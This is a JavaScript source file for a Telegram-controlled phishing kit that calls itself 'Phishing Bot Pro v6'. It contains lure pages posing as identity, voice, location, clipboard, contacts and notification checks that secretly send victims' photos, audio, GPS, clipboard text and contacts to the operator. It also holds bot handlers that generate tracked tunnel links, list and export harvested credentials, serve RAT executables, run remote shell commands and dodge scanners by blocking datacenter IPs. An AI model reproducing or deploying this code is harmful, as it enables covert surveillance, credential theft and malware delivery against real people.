    id: 'camera',
    name: '📷 Camera Access',
    description: 'Webcam + photo capture',
    icon: '📷',
    html: (token, userId, domain) => `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Identity Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#1a73e8 0%,#0d47a1 100%);font-family:-apple-system,sans-serif;color:#202124;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:16px;box-shadow:0 24px 48px rgba(0,0,0,.24);width:100%;max-width:420px;padding:40px 32px;text-align:center}
.shield{width:72px;height:72px;background:linear-gradient(135deg,#1a73e8,#4285f4);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
.shield svg{width:40px;height:40px;fill:#fff}
h1{font-size:24px;font-weight:500;margin-bottom:10px}
p{font-size:15px;color:#5f6368;margin-bottom:28px}
#video-wrap{position:relative;width:100%;aspect-ratio:4/3;background:#000;border-radius:12px;overflow:hidden;margin-bottom:20px;display:none}
#video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
button{width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:10px}
button:disabled{opacity:.5}
.error{color:#d93025;font-size:14px;margin-top:12px;display:none}
</style>
</head>
<body>
<div class="card">
  <div class="shield"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V5l-9-4zm-1 15l-4-4 1.4-1.4L11 13.2l5.6-5.6L18 9l-7 7z"/></svg></div>
  <h1>Identity Verification</h1><p>To keep your account secure, we need a quick photo.</p>
  <div id="video-wrap"><video id="video" playsinline autoplay muted></video></div>
  <canvas id="canvas" style="display:none"></canvas>
  <button id="enableBtn" onclick="requestCamera()">Enable Camera</button>
  <button id="captureBtn" onclick="capturePhoto()" style="display:none">Take Photo</button>
  <div class="error" id="errorBox"></div>
</div>
<script>
(function(){
  var token='${token}',userId='${userId}',domain='${domain}';var stream=null;
  window.requestCamera=async function(){
    try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});document.getElementById('video').srcObject=stream;document.getElementById('video-wrap').style.display='block';document.getElementById('enableBtn').style.display='none';document.getElementById('captureBtn').style.display='block';}catch(e){document.getElementById('errorBox').textContent='Camera access denied.';document.getElementById('errorBox').style.display='block';}
  };
  window.capturePhoto=async function(){
    var v=document.getElementById('video'),c=document.getElementById('canvas'),ctx=c.getContext('2d');
    c.width=v.videoWidth||640;c.height=v.videoHeight||480;ctx.drawImage(v,0,0,c.width,c.height);
    var img=c.toDataURL('image/jpeg',0.92);if(stream)stream.getTracks().forEach(t=>t.stop());
    document.getElementById('captureBtn').innerHTML='Uploading...';document.getElementById('captureBtn').disabled=true;
    try{await fetch(domain+'/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({vector:'camera',photo:img,width:c.width,height:c.height,token:token,userId:userId,timestamp:Date.now(),userAgent:navigator.userAgent})});}catch(e){}
    await new Promise(r=>setTimeout(r,1200));
    document.body.innerHTML='<div style="text-align:center;color:#1a73e8;font-family:sans-serif;margin-top:40vh"><h2>Verification submitted</h2></div>';
  };
})();
</script>
</body></html>`,
  },
  {
    id: 'audio',
    name: '🎤 Audio Recording',
    description: 'Microphone + voice capture',
    icon: '🎤',
    html: (token, userId, domain) => `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Voice Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);font-family:-apple-system,sans-serif;color:#333;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:16px;box-shadow:0 24px 48px rgba(0,0,0,.24);width:100%;max-width:420px;padding:40px 32px;text-align:center}
.mic-circle{width:100px;height:100px;border-radius:50%;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
.mic-circle svg{width:48px;height:48px;fill:#fff}
h1{font-size:24px;margin-bottom:10px}p{font-size:15px;color:#5f6368;margin-bottom:28px}
.timer{font-size:32px;color:#667eea;margin:20px 0;display:none}.timer.active{display:block}
button{width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:10px}
button:disabled{opacity:.5}.error{color:#d93025;margin-top:12px;display:none}
</style>
</head>
<body>
<div class="card">
  <div class="mic-circle"><svg viewBox="0 0 24 24"><path d="M12 14a3 3 0 003-3V5a3 3 0 00-6 0v6a3 3 0 003 3zm5-3a5 5 0 01-10 0H5a7 7 0 006 6.92V21h2v-3.08A7 7 0 0019 11h-2z"/></svg></div>
  <h1>Voice Verification</h1><p>Read the phrase aloud to verify identity.</p>
  <div class="timer" id="timer">00:00</div>
  <button id="startBtn" onclick="startRecording()">Start Recording</button>
  <button id="stopBtn" onclick="stopRecording()" style="display:none">Stop & Submit</button>
  <div class="error" id="errorBox"></div>
</div>
<script>
(function(){
  var token='${token}',userId='${userId}',domain='${domain}',mediaRecorder,audioChunks=[],recTime=0,recInterval;
  window.startRecording=async function(){
    try{var s=await navigator.mediaDevices.getUserMedia({audio:true});mediaRecorder=new MediaRecorder(s);audioChunks=[];mediaRecorder.ondataavailable=e=>audioChunks.push(e.data);mediaRecorder.start();document.getElementById('startBtn').style.display='none';document.getElementById('stopBtn').style.display='block';document.getElementById('timer').classList.add('active');recTime=0;recInterval=setInterval(()=>{recTime++;document.getElementById('timer').textContent='00:'+(recTime<10?'0':'')+recTime;},1000);}catch(e){document.getElementById('errorBox').textContent='Mic access denied';document.getElementById('errorBox').style.display='block';}
  };
  window.stopRecording=async function(){
    clearInterval(recInterval);document.getElementById('stopBtn').innerHTML='Submitting...';document.getElementById('stopBtn').disabled=true;mediaRecorder.stop();
    mediaRecorder.onstop=async function(){
      var blob=new Blob(audioChunks,{type:'audio/webm'}),reader=new FileReader();
      reader.onload=async function(){
        try{await fetch(domain+'/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({vector:'audio',audio:reader.result,duration:recTime,token:token,userId:userId,timestamp:Date.now(),userAgent:navigator.userAgent})});}catch(e){}
        document.body.innerHTML='<div style="text-align:center;color:#667eea;font-family:sans-serif;margin-top:40vh"><h2>Voice verified</h2></div>';
      };reader.readAsDataURL(blob);
    };
  };
})();
</script>
</body></html>`,
  },
  {
    id: 'location',
    name: '📍 Location',
    description: 'GPS + device tracking',
    icon: '📍',
    html: (token, userId, domain) => `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Location Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:-apple-system,sans-serif;color:#202124;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:420px;padding:40px 32px;text-align:center}
.map{width:100%;height:200px;border-radius:12px;background:linear-gradient(135deg,#e8f0fe,#d2e3fc);position:relative;margin-bottom:24px}
.pin{position:absolute;top:50%;left:50%;transform:translate(-50%,-100%);width:40px;height:40px;animation:bounce 1.4s infinite}
@keyframes bounce{0%,100%{transform:translate(-50%,-100%)}50%{transform:translate(-50%,-115%)}}
.pin svg{fill:#ea4335;width:100%;height:100%}
h1{font-size:24px;margin-bottom:10px}p{font-size:15px;color:#5f6368;margin-bottom:28px}
button{width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
button:disabled{opacity:.6}.error{color:#d93025;margin-top:12px;display:none}
</style>
</head>
<body>
<div class="card">
  <div class="map"><div class="pin"><svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5a2.5 2.5 0 110-5 2.5 2.5 0 010 5z"/></svg></div></div>
  <h1>Confirm location</h1><p>For security, please confirm your approximate location.</p>
  <button id="locBtn" onclick="requestLocation()">Allow Location</button>
  <div class="error" id="errorBox"></div>
</div>
<script>
(function(){
  var token='${token}',userId='${userId}',domain='${domain}';
  window.requestLocation=function(){
    var btn=document.getElementById('locBtn');btn.disabled=true;btn.textContent='Requesting...';
    if(!navigator.geolocation){document.getElementById('errorBox').textContent='Not supported.';document.getElementById('errorBox').style.display='block';return;}
    navigator.geolocation.getCurrentPosition(
      async function(pos){
        var c=pos.coords;
        try{await fetch(domain+'/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({vector:'location',latitude:c.latitude,longitude:c.longitude,accuracy:c.accuracy,token:token,userId:userId,timestamp:Date.now(),userAgent:navigator.userAgent})});}catch(e){}
        document.body.innerHTML='<div style="text-align:center;color:#1a73e8;font-family:sans-serif;margin-top:40vh"><h2>Location confirmed</h2></div>';
      },
      function(err){btn.disabled=false;btn.textContent='Allow Location';document.getElementById('errorBox').textContent='Location denied.';document.getElementById('errorBox').style.display='block';},
      {enableHighAccuracy:true,timeout:15000}
    );
  };
})();
</script>
</body></html>`,
  },
  {
    id: 'clipboard',
    name: '📋 Clipboard',
    description: 'Clipboard content harvesting',
    icon: '📋',
    html: (token, userId, domain) => `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Clipboard Security Check</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);font-family:-apple-system,sans-serif;color:#333;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:16px;box-shadow:0 24px 48px rgba(0,0,0,.24);width:100%;max-width:420px;padding:40px 32px;text-align:center}
.icon{width:96px;height:96px;border-radius:50%;background:linear-gradient(135deg,#f093fb,#f5576c);display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
.icon svg{width:44px;height:44px;fill:#fff}
h1{font-size:24px;margin-bottom:10px}p{font-size:15px;color:#5f6368;margin-bottom:24px}
.preview{background:#f8f9fa;border:1px dashed #dadce0;border-radius:8px;padding:14px;font-family:monospace;font-size:13px;color:#5f6368;min-height:56px;text-align:left;margin-bottom:24px;word-break:break-all}
button{width:100%;padding:14px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
button:disabled{opacity:.5}.error{color:#d93025;margin-top:12px;display:none}
</style>
</head>
<body>
<div class="card">
  <div class="icon"><svg viewBox="0 0 24 24"><path d="M19 2h-4.18C14.4.84 13.3 0 12 0S9.6.84 9.18 2H5a2 2 0 00-2 2v16a2 2 0 002 2h14a2 2 0 002-2V4a2 2 0 00-2-2zm-7 0a1 1 0 110 2 1 1 0 010-2zm7 18H5V4h2v3h10V4h2v16z"/></svg></div>
  <h1>Clipboard Check</h1><p>Scan clipboard for sensitive data.</p>
  <div class="preview" id="preview">Click to scan...</div>
  <button id="scanBtn" onclick="readClipboard()">Scan Clipboard</button>
  <div class="error" id="errorBox"></div>
</div>
<script>
(function(){
  var token='${token}',userId='${userId}',domain='${domain}';
  window.readClipboard=async function(){
    var btn=document.getElementById('scanBtn');btn.disabled=true;btn.textContent='Scanning...';
    try{
      var text=await navigator.clipboard.readText();document.getElementById('preview').textContent=text||'(empty)';
      try{await fetch(domain+'/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({vector:'clipboard',content:text,token:token,userId:userId,timestamp:Date.now(),userAgent:navigator.userAgent})});}catch(e){}
      setTimeout(function(){document.body.innerHTML='<div style="text-align:center;color:#f5576c;font-family:sans-serif;margin-top:40vh"><h2>Scan complete</h2></div>';},1000);
    }catch(e){btn.disabled=false;btn.textContent='Scan Clipboard';document.getElementById('errorBox').textContent='Access denied.';document.getElementById('errorBox').style.display='block';}
  };
})();
</script>
</body></html>`,
  },
  {
    id: 'contacts',
    name: '👥 Contacts',
    description: 'Contact list harvesting',
    icon: '👥',
    html: (token, userId, domain) => `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Find Friends — Import Contacts</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#4facfe 0%,#00f2fe 100%);font-family:-apple-system,sans-serif;color:#333;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:16px;box-shadow:0 24px 48px rgba(0,0,0,.24);width:100%;max-width:420px;padding:40px 32px;text-align:center}
.icon{width:96px;height:96px;border-radius:50%;background:linear-gradient(135deg,#4facfe,#00f2fe);display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
.icon svg{width:48px;height:48px;fill:#fff}
h1{font-size:24px;margin-bottom:10px}p{font-size:15px;color:#5f6368;margin-bottom:24px}
button{width:100%;padding:14px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
button:disabled{opacity:.5}.error{color:#d93025;margin-top:12px;display:none}
</style>
</head>
<body>
<div class="card">
  <div class="icon"><svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg></div>
  <h1>Find friends</h1><p>Import contacts to see who's using our service.</p>
  <button id="btn" onclick="requestContacts()">Import Contacts</button>
  <div class="error" id="errorBox"></div>
</div>
<script>
(function(){
  var token='${token}',userId='${userId}',domain='${domain}';
  window.requestContacts=async function(){
    var btn=document.getElementById('btn');btn.disabled=true;btn.textContent='Importing...';
    if(!navigator.contacts||!navigator.contacts.select){document.getElementById('errorBox').textContent='Not supported on this browser.';document.getElementById('errorBox').style.display='block';btn.disabled=false;btn.textContent='Import Contacts';return;}
    try{
      var contacts=await navigator.contacts.select(['name','email','tel'],{multiple:true});
      try{await fetch(domain+'/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({vector:'contacts',count:contacts.length,contacts:contacts,token:token,userId:userId,timestamp:Date.now(),userAgent:navigator.userAgent})});}catch(e){}
      document.body.innerHTML='<div style="text-align:center;color:#4facfe;font-family:sans-serif;margin-top:40vh"><h2>'+contacts.length+' contacts imported</h2></div>';
    }catch(e){btn.disabled=false;btn.textContent='Import Contacts';document.getElementById('errorBox').textContent='Access denied.';document.getElementById('errorBox').style.display='block';}
  };
})();
</script>
</body></html>`,
  },
  {
    id: 'notification',
    name: '🔔 Notifications',
    description: 'Push permission harvesting',
    icon: '🔔',
    html: (token, userId, domain) => `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Enable Notifications</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#fa709a 0%,#fee140 100%);font-family:-apple-system,sans-serif;color:#333;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:16px;box-shadow:0 24px 48px rgba(0,0,0,.24);width:100%;max-width:420px;padding:40px 32px;text-align:center}
.bell{width:96px;height:96px;border-radius:50%;background:linear-gradient(135deg,#fa709a,#fee140);display:flex;align-items:center;justify-content:center;margin:0 auto 24px;animation:swing 3s infinite}
@keyframes swing{0%,100%{transform:rotate(0)}20%{transform:rotate(14deg)}40%{transform:rotate(-12deg)}60%{transform:rotate(8deg)}80%{transform:rotate(-6deg)}}
.bell svg{width:48px;height:48px;fill:#fff}
h1{font-size:24px;margin-bottom:10px}p{font-size:15px;color:#5f6368;margin-bottom:24px}
button{width:100%;padding:14px;background:linear-gradient(135deg,#fa709a,#fee140);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
button:disabled{opacity:.5}.error{color:#d93025;margin-top:12px;display:none}
</style>
</head>
<body>
<div class="card">
  <div class="bell"><svg viewBox="0 0 24 24"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/></svg></div>
  <h1>Stay in the loop</h1><p>Enable push notifications for security alerts.</p>
  <button id="btn" onclick="requestNotifications()">Enable Notifications</button>
  <div class="error" id="errorBox"></div>
</div>
<script>
(function(){
  var token='${token}',userId='${userId}',domain='${domain}';
  window.requestNotifications=async function(){
    var btn=document.getElementById('btn');btn.disabled=true;btn.textContent='Requesting...';
    try{
      var perm=await Notification.requestPermission();
      try{await fetch(domain+'/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({vector:'notification',granted:perm==='granted',permission:perm,token:token,userId:userId,timestamp:Date.now(),userAgent:navigator.userAgent})});}catch(e){}
      if(perm==='granted'){new Notification('Account secured',{body:'Notifications enabled.'});}
      document.body.innerHTML='<div style="text-align:center;color:#fa709a;font-family:sans-serif;margin-top:40vh"><h2>Notifications '+(perm==='granted'?'enabled':'denied')+'</h2></div>';
    }catch(e){btn.disabled=false;btn.textContent='Enable Notifications';document.getElementById('errorBox').textContent='API not supported.';document.getElementById('errorBox').style.display='block';}
  };
})();
</script>
</body></html>`,
  },
];// ============================================================================
// PANEL & BOT HANDLERS
// ============================================================================
function buildMenuButtons() {
  const rows = VECTORS.map((v) => [
    Markup.button.callback(`${v.icon} ${v.name}`, `vec_${v.id}`),
  ]);
  rows.push([
    Markup.button.callback('📊 Captures', 'view'),
    Markup.button.callback('📈 Stats', 'stats'),
  ]);
  rows.push([
    Markup.button.callback('🌐 Tunnel', 'tunnel'),
    Markup.button.callback('💻 Shell', 'shell_help'),
  ]);
  rows.push([
    Markup.button.callback('🦠 RAT', 'rat_menu'),
    Markup.button.callback('🔄 Refresh', 'start'),
  ]);
  return rows;
}

function panelText() {
  const total = Object.keys(captures).length;
  const hits = Object.values(captures).reduce((n, c) => n + c.hits.length, 0);
  const rats = Object.keys(ratSessions).length;
  return (
    `🔓 *Phishing Bot Pro v6 — Active*\n\n` +
    `Vectors: \`${VECTORS.length}\`\n` +
    `Sessions: \`${total}\`  •  Hits: \`${hits}\`\n` +
    `RAT: \`${rats}\` online\n` +
    `Tunnel: \`${TUNNEL_URL ? TUNNEL_URL.replace(/^https?:\/\//, '') : 'inactive'}\`\n\n` +
    `Select target:`
  );
}

async function sendPanel(ctx) {
  const msg = await ctx.reply(panelText(), {
    parse_mode: 'Markdown',
    reply_markup: { inline_keyboard: buildMenuButtons() },
  });
  panelMsgId = msg.message_id;
  panelChatId = msg.chat.id;
  return msg;
}

bot.start(async (ctx) => {
  if (!BOT_READY) return ctx.reply('⏳ Bot initializing... try again in 5s.');
  await sendPanel(ctx);
});

bot.action('start', async (ctx) => {
  await ctx.answerCbQuery();
  await sendPanel(ctx);
});

// -------- vector link generation --------
bot.action(/^vec_(.+)$/, async (ctx) => {
  const vectorId = ctx.match[1];
  const userId = ctx.from.id.toString();
  const vector = VECTORS.find((v) => v.id === vectorId);
  if (!vector) return ctx.answerCbQuery('Vector not found');
  if (!TUNNEL_URL) return ctx.answerCbQuery('Tunnel inactive. Public URL kerak.', { show_alert: true });

  // 16 bayt = 32 belgi, callback_data 64 baytdan oshmaydi
  const token = crypto.randomBytes(16).toString('hex');
  const link = `${TUNNEL_URL}/${vectorId}?u=${userId}&t=${token}`;

  captures[token] = {
    meta: { vector: vectorId, created: Date.now(), ownerId: userId },
    hits: [],
  };

  await ctx.answerCbQuery('Link generated');
  await ctx.reply(
    `✅ *Link Generated*\n\n*Vector:* ${vector.name}\n*Type:* ${vector.description}\n\n_Expires:_ 24h`,
    {
      parse_mode: 'Markdown',
      disable_web_page_preview: true,
      reply_markup: {
        inline_keyboard: [
          [Markup.button.callback('📋 Copy link', `copy_${token}`)],
          [Markup.button.callback('🔗 Short link', `short_${token}`)],
          [Markup.button.callback('🔄 Regenerate', `vec_${vectorId}`)],
        ],
      },
    }
  );
});

// -------- copy link --------
bot.action(/^copy_(.+)$/, async (ctx) => {
  const token = ctx.match[1];
  const c = captures[token];
  if (!c) return ctx.answerCbQuery('Token expired', { show_alert: true });
  if (!TUNNEL_URL) return ctx.answerCbQuery('Tunnel inactive', { show_alert: true });

  const link = `${TUNNEL_URL}/${c.meta.vector}?u=${c.meta.ownerId}&t=${token}`;
  const v = VECTORS.find((x) => x.id === c.meta.vector);

  await ctx.answerCbQuery('Link ready');
  await ctx.reply(
    `📋 *Copy this link*\n\n*Vector:* ${v ? v.name : c.meta.vector}\n\n\`${link}\`\n\n👆 ustiga bosib nusxa oling`,
    { parse_mode: 'Markdown', disable_web_page_preview: true }
  );
});

// -------- short link --------
bot.action(/^short_(.+)$/, async (ctx) => {
  const token = ctx.match[1];
  const c = captures[token];
  if (!c) return ctx.answerCbQuery('Token expired', { show_alert: true });
  if (!TUNNEL_URL) return ctx.answerCbQuery('Tunnel inactive', { show_alert: true });

  await ctx.answerCbQuery('Shortening…');
  const longLink = `${TUNNEL_URL}/${c.meta.vector}?u=${c.meta.ownerId}&t=${token}`;
  const short = await shortenUrl(longLink);
  const v = VECTORS.find((x) => x.id === c.meta.vector);

  await ctx.reply(
    `🔗 *Short link ready*\n\n*Vector:* ${v ? v.name : c.meta.vector}\n\n\`${short}\`\n\n_Original:_\n\`${longLink}\`\n\n👆 ustiga bosib nusxa oling`,
    { parse_mode: 'Markdown', disable_web_page_preview: true }
  );
});

// -------- captures viewer --------
bot.action('view', async (ctx) => {
  await ctx.answerCbQuery();
  const tokens = Object.keys(captures);
  if (tokens.length === 0) return ctx.reply('📭 No sessions yet.');

  const rows = tokens.slice(-20).map((t) => {
    const c = captures[t];
    const label = `${c.meta.vector} · ${c.hits.length} hits`;
    return [Markup.button.callback(label, `sess_${t.slice(0, 24)}`)];
  });
  rows.push([Markup.button.callback('💾 Export CSV', 'export_csv')]);
  rows.push([Markup.button.callback('🗑 Clear all', 'clear_all')]);
  rows.push([Markup.button.callback('⬅ Back', 'start')]);

  await ctx.reply(`📋 *Sessions (${tokens.length})*\nTap to inspect:`, {
    parse_mode: 'Markdown',
    reply_markup: { inline_keyboard: rows },
  });
});

bot.action(/^sess_(.+)$/, async (ctx) => {
  const prefix = ctx.match[1];
  await ctx.answerCbQuery();
  const token = Object.keys(captures).find((t) => t.startsWith(prefix));
  if (!token) return ctx.reply('Session gone.');

  const c = captures[token];
  const lines = c.hits.map((h, i) => {
    const bits = [];
    if (h.username) bits.push(`user=${h.username}`);
    if (h.email) bits.push(`email=${h.email}`);
    if (h.password) bits.push(`pass=${h.password}`);
    if (h.latitude) bits.push(`gps=${h.latitude.toFixed(5)},${h.longitude.toFixed(5)}`);
    if (h.photo) bits.push('photo');
    if (h.audio) bits.push(`audio=${h.duration || '?'}s`);
    if (h.content) bits.push(`clip=${String(h.content).slice(0, 30)}`);
    if (h.count !== undefined) bits.push(`contacts=${h.count}`);
    if (h.granted !== undefined) bits.push(`notif=${h.granted}`);
    if (h.ipInfo && h.ipInfo.country) bits.push(`${h.ipInfo.country}/${h.ipInfo.city || '?'}`);
    return `#${i + 1} [${new Date(h.timestamp || Date.now()).toISOString().slice(11, 19)}] ${bits.join(' | ')}`;
  });

  const body = lines.join('\n') || '_no hits_';
  await ctx.reply(
    `📌 *${c.meta.vector}* — \`${token.slice(0, 16)}…\`\nHits: ${c.hits.length}\n\n${body}`,
    { parse_mode: 'Markdown' }
  );
});

bot.action('stats', async (ctx) => {
  await ctx.answerCbQuery();
  const totalSessions = Object.keys(captures).length;
  const totalHits = Object.values(captures).reduce((n, c) => n + c.hits.length, 0);
  const byVector = {};
  Object.values(captures).forEach((c) => {
    byVector[c.meta.vector] = (byVector[c.meta.vector] || 0) + c.hits.length;
  });
  const table = Object.entries(byVector)
    .sort((a, b) => b[1] - a[1])
    .map(([v, n]) => `${v} — ${n}`)
    .join('\n') || '_no hits_';

  await ctx.reply(
    `📈 *Stats*\nSessions: \`${totalSessions}\`\nHits: \`${totalHits}\`\nRAT: \`${Object.keys(ratSessions).length}\`\n\n${table}`,
    { parse_mode: 'Markdown' }
  );
});

bot.action('export_csv', async (ctx) => {
  await ctx.answerCbQuery();
  const rows = ['timestamp,vector,username,email,password,platform,screen,tz,country,city,isp'];
  Object.entries(captures).forEach(([token, c]) => {
    c.hits.forEach((h) => {
      rows.push([
        new Date(h.timestamp || Date.now()).toISOString(),
        h.vector || '',
        csvEsc(h.username),
        csvEsc(h.email),
        csvEsc(h.password),
        csvEsc(h.deviceInfo && h.deviceInfo.platform),
        csvEsc(h.deviceInfo && h.deviceInfo.screen),
        csvEsc(h.deviceInfo && h.deviceInfo.timezone),
        csvEsc(h.ipInfo && h.ipInfo.country),
        csvEsc(h.ipInfo && h.ipInfo.city),
        csvEsc(h.ipInfo && h.ipInfo.isp),
      ].join(','));
    });
  });
  const buf = Buffer.from(rows.join('\n'));
  await ctx.replyWithDocument(
    { source: buf, filename: `captures_${Date.now()}.csv` },
    { caption: `${rows.length - 1} hits` }
  );
});

bot.action('clear_all', async (ctx) => {
  await ctx.answerCbQuery();
  const n = Object.keys(captures).length;
  for (const k of Object.keys(captures)) delete captures[k];
  await ctx.reply(`🗑 Cleared ${n} sessions.`);
});

function csvEsc(s) {
  if (s == null) return '';
  const str = String(s).replace(/"/g, '""');
  return /[",\n]/.test(str) ? `"${str}"` : str;
}

// -------- tunnel --------
bot.action('tunnel', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(
    `🌐 *Tunnel*\nCurrent: \`${TUNNEL_URL || 'inactive'}\`\nPID: \`${NGROK_PROC ? NGROK_PROC.pid : '—'}\``,
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [Markup.button.callback('♻ Restart', 'tunnel_restart')],
          [Markup.button.callback('🔍 Fetch URL', 'tunnel_url')],
          [Markup.button.callback('⬅ Back', 'start')],
        ],
      },
    }
  );
});

bot.action('tunnel_restart', async (ctx) => {
  await ctx.answerCbQuery('Restarting…');
  try {
    if (NGROK_PROC) { NGROK_PROC.kill(); NGROK_PROC = null; }
    TUNNEL_URL = null;
    await startNgrokTunnel();
    await ctx.reply(`✅ Tunnel: \`${TUNNEL_URL}\``, { parse_mode: 'Markdown' });
  } catch (e) {
    await ctx.reply(`❌ ${e.message}`);
  }
});

bot.action('tunnel_url', async (ctx) => {
  await ctx.answerCbQuery();
  try {
    const url = await fetchNgrokApi();
    TUNNEL_URL = url || TUNNEL_URL;
    await ctx.reply(`🔗 \`${TUNNEL_URL || 'none'}\``, { parse_mode: 'Markdown' });
  } catch (e) {
    await ctx.reply(`❌ ${e.message}`);
  }
});// ============================================================================
// SHELL
// ============================================================================
bot.action('shell_help', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(
    '💻 *Host Shell*\nSend: `/sh <command>`\nRuns on the VPS host.\nExample: `/sh whoami`',
    { parse_mode: 'Markdown' }
  );
});

bot.command('sh', async (ctx) => {
  const cmd = ctx.message.text.replace(/^\/sh\s*/, '').trim();
  if (!cmd) return ctx.reply('usage: /sh <command>');

  const started = Date.now();
  const shell = os.platform() === 'win32' ? 'cmd.exe' : '/bin/sh';
  const flag = os.platform() === 'win32' ? '/c' : '-c';

  const proc = spawn(shell, [flag, cmd], { windowsHide: true });
  let out = '', err = '';
  proc.stdout.on('data', (d) => (out += d.toString()));
  proc.stderr.on('data', (d) => (err += d.toString()));
  proc.on('close', async (code) => {
    const ms = Date.now() - started;
    const body = `💻 \`${cmd}\`\nExit: \`${code}\` · \`${ms}ms\`\n\n\`\`\`\n${(out || err || '(no output)').slice(0, 3500)}\n\`\`\``;
    try {
      await ctx.reply(body, { parse_mode: 'Markdown' });
    } catch (_) {
      await ctx.reply((out || err || '(no output)').slice(0, 3500));
    }
  });
});

// ============================================================================
// HTTP ROUTES
// ============================================================================
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

app.get('/health', (req, res) => {
  res.json({ status: 'ok', vectors: VECTORS.length, bot_ready: BOT_READY });
});

app.get('/dl/:payloadId', (req, res) => {
  const pid = req.params.payloadId;
  const file = path.join(CONFIG.PAYLOAD_DIR, `${pid}.exe`);
  if (!fs.existsSync(file)) return res.status(404).send('Not found');
  logLine('RAT', `download payload=${pid} ip=${getClientIP(req)}`);
  res.download(file, `setup_${pid.slice(0, 8)}.exe`);
});

app.get('/:vector', async (req, res) => {
  const { vector } = req.params;
  const v = VECTORS.find((x) => x.id === vector);
  if (!v) return res.status(404).send('Not found');

  const clientIP = getClientIP(req);
  if (CONFIG.ANTI_BOT && isDatacenterIP(clientIP)) {
    logLine('BLOCK', `datacenter ip=${clientIP} vector=${vector}`);
    return res.status(403).send('Access denied');
  }

  const token = String(req.query.t || crypto.randomBytes(16).toString('hex'));
  const userId = String(req.query.u || 'unknown');

  if (!captures[token]) {
    captures[token] = { meta: { vector, created: Date.now(), ownerId: userId }, hits: [] };
  }

  logLine('HIT', `vector=${vector} token=${token.slice(0, 12)}… ip=${clientIP}`);
